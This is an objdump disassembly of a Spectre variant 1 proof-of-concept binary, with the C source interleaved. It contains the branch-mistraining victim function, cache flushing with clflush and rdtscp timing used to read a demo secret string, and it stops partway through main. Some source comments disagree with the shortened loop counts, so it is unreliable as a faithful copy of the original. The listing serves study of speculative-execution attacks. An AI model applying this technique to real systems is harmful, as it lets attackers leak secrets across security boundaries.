
./spectre_test_elf:     file format elf64-x86-64


Disassembly of section .init:

0000000000000630 <_init>:
 630:	48 83 ec 08          	sub    $0x8,%rsp
 634:	48 8b 05 ad 19 20 00 	mov    0x2019ad(%rip),%rax        # 201fe8 <__gmon_start__>
 63b:	48 85 c0             	test   %rax,%rax
 63e:	74 02                	je     642 <_init+0x12>
 640:	ff d0                	callq  *%rax
 642:	48 83 c4 08          	add    $0x8,%rsp
 646:	c3                   	retq   

Disassembly of section .plt:

0000000000000650 <.plt>:
 650:	ff 35 4a 19 20 00    	pushq  0x20194a(%rip)        # 201fa0 <_GLOBAL_OFFSET_TABLE_+0x8>
 656:	ff 25 4c 19 20 00    	jmpq   *0x20194c(%rip)        # 201fa8 <_GLOBAL_OFFSET_TABLE_+0x10>
 65c:	0f 1f 40 00          	nopl   0x0(%rax)

0000000000000660 <putchar@plt>:
 660:	ff 25 4a 19 20 00    	jmpq   *0x20194a(%rip)        # 201fb0 <putchar@GLIBC_2.2.5>
 666:	68 00 00 00 00       	pushq  $0x0
 66b:	e9 e0 ff ff ff       	jmpq   650 <.plt>

0000000000000670 <strlen@plt>:
 670:	ff 25 42 19 20 00    	jmpq   *0x201942(%rip)        # 201fb8 <strlen@GLIBC_2.2.5>
 676:	68 01 00 00 00       	pushq  $0x1
 67b:	e9 d0 ff ff ff       	jmpq   650 <.plt>

0000000000000680 <__stack_chk_fail@plt>:
 680:	ff 25 3a 19 20 00    	jmpq   *0x20193a(%rip)        # 201fc0 <__stack_chk_fail@GLIBC_2.4>
 686:	68 02 00 00 00       	pushq  $0x2
 68b:	e9 c0 ff ff ff       	jmpq   650 <.plt>

0000000000000690 <printf@plt>:
 690:	ff 25 32 19 20 00    	jmpq   *0x201932(%rip)        # 201fc8 <printf@GLIBC_2.2.5>
 696:	68 03 00 00 00       	pushq  $0x3
 69b:	e9 b0 ff ff ff       	jmpq   650 <.plt>

00000000000006a0 <__isoc99_sscanf@plt>:
 6a0:	ff 25 2a 19 20 00    	jmpq   *0x20192a(%rip)        # 201fd0 <__isoc99_sscanf@GLIBC_2.7>
 6a6:	68 04 00 00 00       	pushq  $0x4
 6ab:	e9 a0 ff ff ff       	jmpq   650 <.plt>

Disassembly of section .plt.got:

00000000000006b0 <__cxa_finalize@plt>:
 6b0:	ff 25 42 19 20 00    	jmpq   *0x201942(%rip)        # 201ff8 <__cxa_finalize@GLIBC_2.2.5>
 6b6:	66 90                	xchg   %ax,%ax

Disassembly of section .text:

00000000000006c0 <_start>:
 6c0:	31 ed                	xor    %ebp,%ebp
 6c2:	49 89 d1             	mov    %rdx,%r9
 6c5:	5e                   	pop    %rsi
 6c6:	48 89 e2             	mov    %rsp,%rdx
 6c9:	48 83 e4 f0          	and    $0xfffffffffffffff0,%rsp
 6cd:	50                   	push   %rax
 6ce:	54                   	push   %rsp
 6cf:	4c 8d 05 fa 07 00 00 	lea    0x7fa(%rip),%r8        # ed0 <__libc_csu_fini>
 6d6:	48 8d 0d 83 07 00 00 	lea    0x783(%rip),%rcx        # e60 <__libc_csu_init>
 6dd:	48 8d 3d 27 05 00 00 	lea    0x527(%rip),%rdi        # c0b <main>
 6e4:	ff 15 f6 18 20 00    	callq  *0x2018f6(%rip)        # 201fe0 <__libc_start_main@GLIBC_2.2.5>
 6ea:	f4                   	hlt    
 6eb:	0f 1f 44 00 00       	nopl   0x0(%rax,%rax,1)

00000000000006f0 <deregister_tm_clones>:
 6f0:	48 8d 3d f1 19 20 00 	lea    0x2019f1(%rip),%rdi        # 2020e8 <__TMC_END__>
 6f7:	55                   	push   %rbp
 6f8:	48 8d 05 e9 19 20 00 	lea    0x2019e9(%rip),%rax        # 2020e8 <__TMC_END__>
 6ff:	48 39 f8             	cmp    %rdi,%rax
 702:	48 89 e5             	mov    %rsp,%rbp
 705:	74 19                	je     720 <deregister_tm_clones+0x30>
 707:	48 8b 05 ca 18 20 00 	mov    0x2018ca(%rip),%rax        # 201fd8 <_ITM_deregisterTMCloneTable>
 70e:	48 85 c0             	test   %rax,%rax
 711:	74 0d                	je     720 <deregister_tm_clones+0x30>
 713:	5d                   	pop    %rbp
 714:	ff e0                	jmpq   *%rax
 716:	66 2e 0f 1f 84 00 00 	nopw   %cs:0x0(%rax,%rax,1)
 71d:	00 00 00 
 720:	5d                   	pop    %rbp
 721:	c3                   	retq   
 722:	0f 1f 40 00          	nopl   0x0(%rax)
 726:	66 2e 0f 1f 84 00 00 	nopw   %cs:0x0(%rax,%rax,1)
 72d:	00 00 00 

0000000000000730 <register_tm_clones>:
 730:	48 8d 3d b1 19 20 00 	lea    0x2019b1(%rip),%rdi        # 2020e8 <__TMC_END__>
 737:	48 8d 35 aa 19 20 00 	lea    0x2019aa(%rip),%rsi        # 2020e8 <__TMC_END__>
 73e:	55                   	push   %rbp
 73f:	48 29 fe             	sub    %rdi,%rsi
 742:	48 89 e5             	mov    %rsp,%rbp
 745:	48 c1 fe 03          	sar    $0x3,%rsi
 749:	48 89 f0             	mov    %rsi,%rax
 74c:	48 c1 e8 3f          	shr    $0x3f,%rax
 750:	48 01 c6             	add    %rax,%rsi
 753:	48 d1 fe             	sar    %rsi
 756:	74 18                	je     770 <register_tm_clones+0x40>
 758:	48 8b 05 91 18 20 00 	mov    0x201891(%rip),%rax        # 201ff0 <_ITM_registerTMCloneTable>
 75f:	48 85 c0             	test   %rax,%rax
 762:	74 0c                	je     770 <register_tm_clones+0x40>
 764:	5d                   	pop    %rbp
 765:	ff e0                	jmpq   *%rax
 767:	66 0f 1f 84 00 00 00 	nopw   0x0(%rax,%rax,1)
 76e:	00 00 
 770:	5d                   	pop    %rbp
 771:	c3                   	retq   
 772:	0f 1f 40 00          	nopl   0x0(%rax)
 776:	66 2e 0f 1f 84 00 00 	nopw   %cs:0x0(%rax,%rax,1)
 77d:	00 00 00 

0000000000000780 <__do_global_dtors_aux>:
 780:	80 3d 79 19 20 00 00 	cmpb   $0x0,0x201979(%rip)        # 202100 <completed.7698>
 787:	75 2f                	jne    7b8 <__do_global_dtors_aux+0x38>
 789:	48 83 3d 67 18 20 00 	cmpq   $0x0,0x201867(%rip)        # 201ff8 <__cxa_finalize@GLIBC_2.2.5>
 790:	00 
 791:	55                   	push   %rbp
 792:	48 89 e5             	mov    %rsp,%rbp
 795:	74 0c                	je     7a3 <__do_global_dtors_aux+0x23>
 797:	48 8b 3d 6a 18 20 00 	mov    0x20186a(%rip),%rdi        # 202008 <__dso_handle>
 79e:	e8 0d ff ff ff       	callq  6b0 <__cxa_finalize@plt>
 7a3:	e8 48 ff ff ff       	callq  6f0 <deregister_tm_clones>
 7a8:	c6 05 51 19 20 00 01 	movb   $0x1,0x201951(%rip)        # 202100 <completed.7698>
 7af:	5d                   	pop    %rbp
 7b0:	c3                   	retq   
 7b1:	0f 1f 80 00 00 00 00 	nopl   0x0(%rax)
 7b8:	f3 c3                	repz retq 
 7ba:	66 0f 1f 44 00 00    	nopw   0x0(%rax,%rax,1)

00000000000007c0 <frame_dummy>:
 7c0:	55                   	push   %rbp
 7c1:	48 89 e5             	mov    %rsp,%rbp
 7c4:	5d                   	pop    %rbp
 7c5:	e9 66 ff ff ff       	jmpq   730 <register_tm_clones>

00000000000007ca <spectre_function>:

char * secret = "PassWord:123456";

uint8_t temp = 0; /* Used so compiler won’t optimize out victim_function() */

void spectre_function(size_t x) {
 7ca:	55                   	push   %rbp
 7cb:	48 89 e5             	mov    %rsp,%rbp
 7ce:	48 89 7d f8          	mov    %rdi,-0x8(%rbp)
  if (x < array1_size) {
 7d2:	8b 05 48 18 20 00    	mov    0x201848(%rip),%eax        # 202020 <array1_size>
 7d8:	89 c0                	mov    %eax,%eax
 7da:	48 39 45 f8          	cmp    %rax,-0x8(%rbp)
 7de:	73 34                	jae    814 <spectre_function+0x4a>
    temp &= array2[array1[x] * 512];
 7e0:	48 8d 15 59 18 20 00 	lea    0x201859(%rip),%rdx        # 202040 <array1>
 7e7:	48 8b 45 f8          	mov    -0x8(%rbp),%rax
 7eb:	48 01 d0             	add    %rdx,%rax
 7ee:	0f b6 00             	movzbl (%rax),%eax
 7f1:	0f b6 c0             	movzbl %al,%eax
 7f4:	c1 e0 09             	shl    $0x9,%eax
 7f7:	48 63 d0             	movslq %eax,%rdx
 7fa:	48 8d 05 7f 1d 20 00 	lea    0x201d7f(%rip),%rax        # 202580 <array2>
 801:	0f b6 14 02          	movzbl (%rdx,%rax,1),%edx
 805:	0f b6 05 14 19 20 00 	movzbl 0x201914(%rip),%eax        # 202120 <temp>
 80c:	21 d0                	and    %edx,%eax
 80e:	88 05 0c 19 20 00    	mov    %al,0x20190c(%rip)        # 202120 <temp>
  }
}
 814:	90                   	nop
 815:	5d                   	pop    %rbp
 816:	c3                   	retq   

0000000000000817 <readMemoryByte>:
Analysis code
********************************************************************/
#define CACHE_HIT_THRESHOLD (80) /* assume cache hit if time <= threshold */
/* Report best guess in value[0] and runner-up in value[1] */
/*kdebug_signpost();*/
void readMemoryByte(size_t malicious_x, uint8_t value[2], int score[2]) {
 817:	55                   	push   %rbp
 818:	48 89 e5             	mov    %rsp,%rbp
 81b:	53                   	push   %rbx
 81c:	48 81 ec 88 00 00 00 	sub    $0x88,%rsp
 823:	48 89 7d 88          	mov    %rdi,-0x78(%rbp)
 827:	48 89 75 80          	mov    %rsi,-0x80(%rbp)
 82b:	48 89 95 78 ff ff ff 	mov    %rdx,-0x88(%rbp)
 832:	64 48 8b 04 25 28 00 	mov    %fs:0x28,%rax
 839:	00 00 
 83b:	48 89 45 e8          	mov    %rax,-0x18(%rbp)
 83f:	31 c0                	xor    %eax,%eax
  static int results[256];
 /* int tries, i, j, k, mix_i, junk = 0; */
  int tries, i, j, k, mix_i;
  unsigned int junk = 0;
 841:	c7 45 94 00 00 00 00 	movl   $0x0,-0x6c(%rbp)
  size_t training_x, x;
  register uint64_t time1, time2;
  volatile uint8_t * addr;

  for (i = 0; i < 2; i++)
 848:	c7 45 a0 00 00 00 00 	movl   $0x0,-0x60(%rbp)
 84f:	eb 1f                	jmp    870 <readMemoryByte+0x59>
    results[i] = 0;
 851:	8b 45 a0             	mov    -0x60(%rbp),%eax
 854:	48 98                	cltq   
 856:	48 8d 14 85 00 00 00 	lea    0x0(,%rax,4),%rdx
 85d:	00 
 85e:	48 8d 05 db 18 20 00 	lea    0x2018db(%rip),%rax        # 202140 <results.23638>
 865:	c7 04 02 00 00 00 00 	movl   $0x0,(%rdx,%rax,1)
  for (i = 0; i < 2; i++)
 86c:	83 45 a0 01          	addl   $0x1,-0x60(%rbp)
 870:	83 7d a0 01          	cmpl   $0x1,-0x60(%rbp)
 874:	7e db                	jle    851 <readMemoryByte+0x3a>
  for (tries = 2; tries > 0; tries--) {
 876:	c7 45 9c 02 00 00 00 	movl   $0x2,-0x64(%rbp)
 87d:	e9 f1 02 00 00       	jmpq   b73 <readMemoryByte+0x35c>
/*kdebug_signpost();*/
    /* Flush array2[256*(0..255)] from cache */
    for (i = 0; i < 2; i++)
 882:	c7 45 a0 00 00 00 00 	movl   $0x0,-0x60(%rbp)
 889:	eb 22                	jmp    8ad <readMemoryByte+0x96>
      _mm_clflush( & array2[i * 512]); /* intrinsic for clflush instruction */
 88b:	8b 45 a0             	mov    -0x60(%rbp),%eax
 88e:	c1 e0 09             	shl    $0x9,%eax
 891:	48 63 d0             	movslq %eax,%rdx
 894:	48 8d 05 e5 1c 20 00 	lea    0x201ce5(%rip),%rax        # 202580 <array2>
 89b:	48 01 d0             	add    %rdx,%rax
 89e:	48 89 45 c8          	mov    %rax,-0x38(%rbp)
}

extern __inline void __attribute__((__gnu_inline__, __always_inline__, __artificial__))
_mm_clflush (void const *__A)
{
  __builtin_ia32_clflush (__A);
 8a2:	48 8b 45 c8          	mov    -0x38(%rbp),%rax
 8a6:	0f ae 38             	clflush (%rax)
    for (i = 0; i < 2; i++)
 8a9:	83 45 a0 01          	addl   $0x1,-0x60(%rbp)
 8ad:	83 7d a0 01          	cmpl   $0x1,-0x60(%rbp)
 8b1:	7e d8                	jle    88b <readMemoryByte+0x74>

    /* 30 loops: 5 training runs (x=training_x) per attack run (x=malicious_x) */
    training_x = tries % array1_size;
 8b3:	8b 45 9c             	mov    -0x64(%rbp),%eax
 8b6:	8b 0d 64 17 20 00    	mov    0x201764(%rip),%ecx        # 202020 <array1_size>
 8bc:	ba 00 00 00 00       	mov    $0x0,%edx
 8c1:	f7 f1                	div    %ecx
 8c3:	89 d0                	mov    %edx,%eax
 8c5:	89 c0                	mov    %eax,%eax
 8c7:	48 89 45 b0          	mov    %rax,-0x50(%rbp)
    for (j = 2; j >= 0; j--) {
 8cb:	c7 45 a4 02 00 00 00 	movl   $0x2,-0x5c(%rbp)
 8d2:	e9 88 00 00 00       	jmpq   95f <readMemoryByte+0x148>
 8d7:	48 8d 05 42 17 20 00 	lea    0x201742(%rip),%rax        # 202020 <array1_size>
 8de:	48 89 45 d0          	mov    %rax,-0x30(%rbp)
 8e2:	48 8b 45 d0          	mov    -0x30(%rbp),%rax
 8e6:	0f ae 38             	clflush (%rax)
      _mm_clflush( & array1_size);
      for (volatile int z = 0; z < 2; z++) {} /* Delay (can also mfence) */
 8e9:	c7 45 98 00 00 00 00 	movl   $0x0,-0x68(%rbp)
 8f0:	eb 09                	jmp    8fb <readMemoryByte+0xe4>
 8f2:	8b 45 98             	mov    -0x68(%rbp),%eax
 8f5:	83 c0 01             	add    $0x1,%eax
 8f8:	89 45 98             	mov    %eax,-0x68(%rbp)
 8fb:	8b 45 98             	mov    -0x68(%rbp),%eax
 8fe:	83 f8 01             	cmp    $0x1,%eax
 901:	7e ef                	jle    8f2 <readMemoryByte+0xdb>

      /* Bit twiddling to set x=training_x if j%6!=0 or malicious_x if j%6==0 */
      /* Avoid jumps in case those tip off the branch predictor */
      x = ((j % 6) - 1) & ~0xFFFF; /* Set x=FFF.FF0000 if j%6==0, else x=0 */
 903:	8b 4d a4             	mov    -0x5c(%rbp),%ecx
 906:	ba ab aa aa 2a       	mov    $0x2aaaaaab,%edx
 90b:	89 c8                	mov    %ecx,%eax
 90d:	f7 ea                	imul   %edx
 90f:	89 c8                	mov    %ecx,%eax
 911:	c1 f8 1f             	sar    $0x1f,%eax
 914:	29 c2                	sub    %eax,%edx
 916:	89 d0                	mov    %edx,%eax
 918:	01 c0                	add    %eax,%eax
 91a:	01 d0                	add    %edx,%eax
 91c:	01 c0                	add    %eax,%eax
 91e:	29 c1                	sub    %eax,%ecx
 920:	89 ca                	mov    %ecx,%edx
 922:	8d 42 ff             	lea    -0x1(%rdx),%eax
 925:	66 b8 00 00          	mov    $0x0,%ax
 929:	48 98                	cltq   
 92b:	48 89 45 c0          	mov    %rax,-0x40(%rbp)
      x = (x | (x >> 16)); /* Set x=-1 if j&6=0, else x=0 */
 92f:	48 8b 45 c0          	mov    -0x40(%rbp),%rax
 933:	48 c1 e8 10          	shr    $0x10,%rax
 937:	48 09 45 c0          	or     %rax,-0x40(%rbp)
      x = training_x ^ (x & (malicious_x ^ training_x));
 93b:	48 8b 45 88          	mov    -0x78(%rbp),%rax
 93f:	48 33 45 b0          	xor    -0x50(%rbp),%rax
 943:	48 23 45 c0          	and    -0x40(%rbp),%rax
 947:	48 33 45 b0          	xor    -0x50(%rbp),%rax
 94b:	48 89 45 c0          	mov    %rax,-0x40(%rbp)

      /* Call the victim! */
      spectre_function(x);
 94f:	48 8b 45 c0          	mov    -0x40(%rbp),%rax
 953:	48 89 c7             	mov    %rax,%rdi
 956:	e8 6f fe ff ff       	callq  7ca <spectre_function>
    for (j = 2; j >= 0; j--) {
 95b:	83 6d a4 01          	subl   $0x1,-0x5c(%rbp)
 95f:	83 7d a4 00          	cmpl   $0x0,-0x5c(%rbp)
 963:	0f 89 6e ff ff ff    	jns    8d7 <readMemoryByte+0xc0>

    }

    /* Time reads. Order is lightly mixed up to prevent stride prediction */
    for (i = 0; i < 2; i++) {
 969:	c7 45 a0 00 00 00 00 	movl   $0x0,-0x60(%rbp)
 970:	e9 d7 00 00 00       	jmpq   a4c <readMemoryByte+0x235>
      mix_i = ((i * 167) + 13) & 255;
 975:	8b 45 a0             	mov    -0x60(%rbp),%eax
 978:	69 c0 a7 00 00 00    	imul   $0xa7,%eax,%eax
 97e:	83 c0 0d             	add    $0xd,%eax
 981:	25 ff 00 00 00       	and    $0xff,%eax
 986:	89 45 ac             	mov    %eax,-0x54(%rbp)
      addr = & array2[mix_i * 512];
 989:	8b 45 ac             	mov    -0x54(%rbp),%eax
 98c:	c1 e0 09             	shl    $0x9,%eax
 98f:	48 63 d0             	movslq %eax,%rdx
 992:	48 8d 05 e7 1b 20 00 	lea    0x201be7(%rip),%rax        # 202580 <array2>
 999:	48 01 d0             	add    %rdx,%rax
 99c:	48 89 45 b8          	mov    %rax,-0x48(%rbp)
 9a0:	48 8d 45 94          	lea    -0x6c(%rbp),%rax
 9a4:	48 89 45 e0          	mov    %rax,-0x20(%rbp)
/* rdtscp */
extern __inline unsigned long long
__attribute__((__gnu_inline__, __always_inline__, __artificial__))
__rdtscp (unsigned int *__A)
{
  return __builtin_ia32_rdtscp (__A);
 9a8:	0f 01 f9             	rdtscp 
 9ab:	89 ce                	mov    %ecx,%esi
 9ad:	48 8b 4d e0          	mov    -0x20(%rbp),%rcx
 9b1:	89 31                	mov    %esi,(%rcx)
 9b3:	48 c1 e2 20          	shl    $0x20,%rdx
 9b7:	48 09 d0             	or     %rdx,%rax
      time1 = __rdtscp( & junk); /* READ TIMER */
 9ba:	48 89 c3             	mov    %rax,%rbx
      junk = * addr; /* MEMORY ACCESS TO TIME */
 9bd:	48 8b 45 b8          	mov    -0x48(%rbp),%rax
 9c1:	0f b6 00             	movzbl (%rax),%eax
 9c4:	0f b6 c0             	movzbl %al,%eax
 9c7:	89 45 94             	mov    %eax,-0x6c(%rbp)
 9ca:	48 8d 45 94          	lea    -0x6c(%rbp),%rax
 9ce:	48 89 45 d8          	mov    %rax,-0x28(%rbp)
 9d2:	0f 01 f9             	rdtscp 
 9d5:	89 ce                	mov    %ecx,%esi
 9d7:	48 8b 4d d8          	mov    -0x28(%rbp),%rcx
 9db:	89 31                	mov    %esi,(%rcx)
 9dd:	48 c1 e2 20          	shl    $0x20,%rdx
 9e1:	48 09 d0             	or     %rdx,%rax
      time2 = __rdtscp( & junk) - time1; /* READ TIMER & COMPUTE ELAPSED TIME */
 9e4:	48 29 d8             	sub    %rbx,%rax
 9e7:	48 89 c3             	mov    %rax,%rbx
      if (time2 <= CACHE_HIT_THRESHOLD && mix_i != array1[tries % array1_size])
 9ea:	48 83 fb 50          	cmp    $0x50,%rbx
 9ee:	77 58                	ja     a48 <readMemoryByte+0x231>
 9f0:	8b 45 9c             	mov    -0x64(%rbp),%eax
 9f3:	8b 0d 27 16 20 00    	mov    0x201627(%rip),%ecx        # 202020 <array1_size>
 9f9:	ba 00 00 00 00       	mov    $0x0,%edx
 9fe:	f7 f1                	div    %ecx
 a00:	89 d0                	mov    %edx,%eax
 a02:	89 c2                	mov    %eax,%edx
 a04:	48 8d 05 35 16 20 00 	lea    0x201635(%rip),%rax        # 202040 <array1>
 a0b:	0f b6 04 02          	movzbl (%rdx,%rax,1),%eax
 a0f:	0f b6 c0             	movzbl %al,%eax
 a12:	39 45 ac             	cmp    %eax,-0x54(%rbp)
 a15:	74 31                	je     a48 <readMemoryByte+0x231>
        results[mix_i]++; /* cache hit - add +1 to score for this value */
 a17:	8b 45 ac             	mov    -0x54(%rbp),%eax
 a1a:	48 98                	cltq   
 a1c:	48 8d 14 85 00 00 00 	lea    0x0(,%rax,4),%rdx
 a23:	00 
 a24:	48 8d 05 15 17 20 00 	lea    0x201715(%rip),%rax        # 202140 <results.23638>
 a2b:	8b 04 02             	mov    (%rdx,%rax,1),%eax
 a2e:	8d 48 01             	lea    0x1(%rax),%ecx
 a31:	8b 45 ac             	mov    -0x54(%rbp),%eax
 a34:	48 98                	cltq   
 a36:	48 8d 14 85 00 00 00 	lea    0x0(,%rax,4),%rdx
 a3d:	00 
 a3e:	48 8d 05 fb 16 20 00 	lea    0x2016fb(%rip),%rax        # 202140 <results.23638>
 a45:	89 0c 02             	mov    %ecx,(%rdx,%rax,1)
    for (i = 0; i < 2; i++) {
 a48:	83 45 a0 01          	addl   $0x1,-0x60(%rbp)
 a4c:	83 7d a0 01          	cmpl   $0x1,-0x60(%rbp)
 a50:	0f 8e 1f ff ff ff    	jle    975 <readMemoryByte+0x15e>
    }

    /* Locate highest & second-highest results results tallies in j/k */
    j = k = -1;
 a56:	c7 45 a8 ff ff ff ff 	movl   $0xffffffff,-0x58(%rbp)
 a5d:	8b 45 a8             	mov    -0x58(%rbp),%eax
 a60:	89 45 a4             	mov    %eax,-0x5c(%rbp)
    for (i = 0; i < 2; i++) {
 a63:	c7 45 a0 00 00 00 00 	movl   $0x0,-0x60(%rbp)
 a6a:	e9 88 00 00 00       	jmpq   af7 <readMemoryByte+0x2e0>
      if (j < 0 || results[i] >= results[j]) {
 a6f:	83 7d a4 00          	cmpl   $0x0,-0x5c(%rbp)
 a73:	78 32                	js     aa7 <readMemoryByte+0x290>
 a75:	8b 45 a0             	mov    -0x60(%rbp),%eax
 a78:	48 98                	cltq   
 a7a:	48 8d 14 85 00 00 00 	lea    0x0(,%rax,4),%rdx
 a81:	00 
 a82:	48 8d 05 b7 16 20 00 	lea    0x2016b7(%rip),%rax        # 202140 <results.23638>
 a89:	8b 14 02             	mov    (%rdx,%rax,1),%edx
 a8c:	8b 45 a4             	mov    -0x5c(%rbp),%eax
 a8f:	48 98                	cltq   
 a91:	48 8d 0c 85 00 00 00 	lea    0x0(,%rax,4),%rcx
 a98:	00 
 a99:	48 8d 05 a0 16 20 00 	lea    0x2016a0(%rip),%rax        # 202140 <results.23638>
 aa0:	8b 04 01             	mov    (%rcx,%rax,1),%eax
 aa3:	39 c2                	cmp    %eax,%edx
 aa5:	7c 0e                	jl     ab5 <readMemoryByte+0x29e>
        k = j;
 aa7:	8b 45 a4             	mov    -0x5c(%rbp),%eax
 aaa:	89 45 a8             	mov    %eax,-0x58(%rbp)
        j = i;
 aad:	8b 45 a0             	mov    -0x60(%rbp),%eax
 ab0:	89 45 a4             	mov    %eax,-0x5c(%rbp)
 ab3:	eb 3e                	jmp    af3 <readMemoryByte+0x2dc>
      } else if (k < 0 || results[i] >= results[k]) {
 ab5:	83 7d a8 00          	cmpl   $0x0,-0x58(%rbp)
 ab9:	78 32                	js     aed <readMemoryByte+0x2d6>
 abb:	8b 45 a0             	mov    -0x60(%rbp),%eax
 abe:	48 98                	cltq   
 ac0:	48 8d 14 85 00 00 00 	lea    0x0(,%rax,4),%rdx
 ac7:	00 
 ac8:	48 8d 05 71 16 20 00 	lea    0x201671(%rip),%rax        # 202140 <results.23638>
 acf:	8b 14 02             	mov    (%rdx,%rax,1),%edx
 ad2:	8b 45 a8             	mov    -0x58(%rbp),%eax
 ad5:	48 98                	cltq   
 ad7:	48 8d 0c 85 00 00 00 	lea    0x0(,%rax,4),%rcx
 ade:	00 
 adf:	48 8d 05 5a 16 20 00 	lea    0x20165a(%rip),%rax        # 202140 <results.23638>
 ae6:	8b 04 01             	mov    (%rcx,%rax,1),%eax
 ae9:	39 c2                	cmp    %eax,%edx
 aeb:	7c 06                	jl     af3 <readMemoryByte+0x2dc>
        k = i;
 aed:	8b 45 a0             	mov    -0x60(%rbp),%eax
 af0:	89 45 a8             	mov    %eax,-0x58(%rbp)
    for (i = 0; i < 2; i++) {
 af3:	83 45 a0 01          	addl   $0x1,-0x60(%rbp)
 af7:	83 7d a0 01          	cmpl   $0x1,-0x60(%rbp)
 afb:	0f 8e 6e ff ff ff    	jle    a6f <readMemoryByte+0x258>
      }
    }
    if (results[j] >= (2 * results[k] + 5) || (results[j] == 2 && results[k] == 0))
 b01:	8b 45 a4             	mov    -0x5c(%rbp),%eax
 b04:	48 98                	cltq   
 b06:	48 8d 14 85 00 00 00 	lea    0x0(,%rax,4),%rdx
 b0d:	00 
 b0e:	48 8d 05 2b 16 20 00 	lea    0x20162b(%rip),%rax        # 202140 <results.23638>
 b15:	8b 14 02             	mov    (%rdx,%rax,1),%edx
 b18:	8b 45 a8             	mov    -0x58(%rbp),%eax
 b1b:	48 98                	cltq   
 b1d:	48 8d 0c 85 00 00 00 	lea    0x0(,%rax,4),%rcx
 b24:	00 
 b25:	48 8d 05 14 16 20 00 	lea    0x201614(%rip),%rax        # 202140 <results.23638>
 b2c:	8b 04 01             	mov    (%rcx,%rax,1),%eax
 b2f:	01 c0                	add    %eax,%eax
 b31:	83 c0 05             	add    $0x5,%eax
 b34:	39 c2                	cmp    %eax,%edx
 b36:	7d 45                	jge    b7d <readMemoryByte+0x366>
 b38:	8b 45 a4             	mov    -0x5c(%rbp),%eax
 b3b:	48 98                	cltq   
 b3d:	48 8d 14 85 00 00 00 	lea    0x0(,%rax,4),%rdx
 b44:	00 
 b45:	48 8d 05 f4 15 20 00 	lea    0x2015f4(%rip),%rax        # 202140 <results.23638>
 b4c:	8b 04 02             	mov    (%rdx,%rax,1),%eax
 b4f:	83 f8 02             	cmp    $0x2,%eax
 b52:	75 1b                	jne    b6f <readMemoryByte+0x358>
 b54:	8b 45 a8             	mov    -0x58(%rbp),%eax
 b57:	48 98                	cltq   
 b59:	48 8d 14 85 00 00 00 	lea    0x0(,%rax,4),%rdx
 b60:	00 
 b61:	48 8d 05 d8 15 20 00 	lea    0x2015d8(%rip),%rax        # 202140 <results.23638>
 b68:	8b 04 02             	mov    (%rdx,%rax,1),%eax
 b6b:	85 c0                	test   %eax,%eax
 b6d:	74 0e                	je     b7d <readMemoryByte+0x366>
  for (tries = 2; tries > 0; tries--) {
 b6f:	83 6d 9c 01          	subl   $0x1,-0x64(%rbp)
 b73:	83 7d 9c 00          	cmpl   $0x0,-0x64(%rbp)
 b77:	0f 8f 05 fd ff ff    	jg     882 <readMemoryByte+0x6b>
      break; /* Clear success if best is > 2*runner-up + 5 or 2/0) */
  }
  results[0] ^= junk; /* use junk so code above won’t get optimized out*/
 b7d:	8b 05 bd 15 20 00    	mov    0x2015bd(%rip),%eax        # 202140 <results.23638>
 b83:	89 c2                	mov    %eax,%edx
 b85:	8b 45 94             	mov    -0x6c(%rbp),%eax
 b88:	31 d0                	xor    %edx,%eax
 b8a:	89 05 b0 15 20 00    	mov    %eax,0x2015b0(%rip)        # 202140 <results.23638>
  value[0] = (uint8_t) j;
 b90:	8b 45 a4             	mov    -0x5c(%rbp),%eax
 b93:	89 c2                	mov    %eax,%edx
 b95:	48 8b 45 80          	mov    -0x80(%rbp),%rax
 b99:	88 10                	mov    %dl,(%rax)
  score[0] = results[j];
 b9b:	8b 45 a4             	mov    -0x5c(%rbp),%eax
 b9e:	48 98                	cltq   
 ba0:	48 8d 14 85 00 00 00 	lea    0x0(,%rax,4),%rdx
 ba7:	00 
 ba8:	48 8d 05 91 15 20 00 	lea    0x201591(%rip),%rax        # 202140 <results.23638>
 baf:	8b 14 02             	mov    (%rdx,%rax,1),%edx
 bb2:	48 8b 85 78 ff ff ff 	mov    -0x88(%rbp),%rax
 bb9:	89 10                	mov    %edx,(%rax)
  value[1] = (uint8_t) k;
 bbb:	48 8b 45 80          	mov    -0x80(%rbp),%rax
 bbf:	48 83 c0 01          	add    $0x1,%rax
 bc3:	8b 55 a8             	mov    -0x58(%rbp),%edx
 bc6:	88 10                	mov    %dl,(%rax)
  score[1] = results[k];
 bc8:	48 8b 85 78 ff ff ff 	mov    -0x88(%rbp),%rax
 bcf:	48 8d 50 04          	lea    0x4(%rax),%rdx
 bd3:	8b 45 a8             	mov    -0x58(%rbp),%eax
 bd6:	48 98                	cltq   
 bd8:	48 8d 0c 85 00 00 00 	lea    0x0(,%rax,4),%rcx
 bdf:	00 
 be0:	48 8d 05 59 15 20 00 	lea    0x201559(%rip),%rax        # 202140 <results.23638>
 be7:	8b 04 01             	mov    (%rcx,%rax,1),%eax
 bea:	89 02                	mov    %eax,(%rdx)
}
 bec:	90                   	nop
 bed:	48 8b 45 e8          	mov    -0x18(%rbp),%rax
 bf1:	64 48 33 04 25 28 00 	xor    %fs:0x28,%rax
 bf8:	00 00 
 bfa:	74 05                	je     c01 <readMemoryByte+0x3ea>
 bfc:	e8 7f fa ff ff       	callq  680 <__stack_chk_fail@plt>
 c01:	48 81 c4 88 00 00 00 	add    $0x88,%rsp
 c08:	5b                   	pop    %rbx
 c09:	5d                   	pop    %rbp
 c0a:	c3                   	retq   

0000000000000c0b <main>:

int main(int argc,
  const char * * argv) {
 c0b:	55                   	push   %rbp
 c0c:	48 89 e5             	mov    %rsp,%rbp
 c0f:	48 83 ec 50          	sub    $0x50,%rsp
 c13:	89 7d bc             	mov    %edi,-0x44(%rbp)
 c16:	48 89 75 b0          	mov    %rsi,-0x50(%rbp)
 c1a:	64 48 8b 04 25 28 00 	mov    %fs:0x28,%rax
 c21:	00 00 
 c23:	48 89 45 f8          	mov    %rax,-0x8(%rbp)
 c27:	31 c0                	xor    %eax,%eax
  size_t malicious_x = (size_t)(secret - (char * ) array1); /* default for malicious_x */
 c29:	48 8b 05 b0 14 20 00 	mov    0x2014b0(%rip),%rax        # 2020e0 <secret>
 c30:	48 89 c2             	mov    %rax,%rdx
 c33:	48 8d 05 06 14 20 00 	lea    0x201406(%rip),%rax        # 202040 <array1>
 c3a:	48 29 c2             	sub    %rax,%rdx
 c3d:	48 89 d0             	mov    %rdx,%rax
 c40:	48 89 45 e0          	mov    %rax,-0x20(%rbp)
  int i, score[2], len = strlen(secret);
 c44:	48 8b 05 95 14 20 00 	mov    0x201495(%rip),%rax        # 2020e0 <secret>
 c4b:	48 89 c7             	mov    %rax,%rdi
